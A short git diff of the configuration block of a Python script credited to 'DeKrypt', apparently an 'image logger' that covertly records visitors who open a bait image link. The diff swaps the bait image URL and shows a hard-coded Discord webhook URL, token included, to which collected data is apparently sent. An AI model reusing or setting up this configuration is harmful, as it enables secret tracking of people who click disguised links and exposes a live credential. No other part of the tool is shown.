@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1337399244721754134/tLTB4pS9uR3QuRzPPlKoR26qU3lFijUCTudOlnepeN5WUCgBRoOCFI18R8cEriGbWhpr",
-    "image": "https://discord.do/wp-content/uploads/2023/08/Marlows-Manor.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://difusoribero.com/wp-content/uploads/2021/07/meme_famoso.png?w=779", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
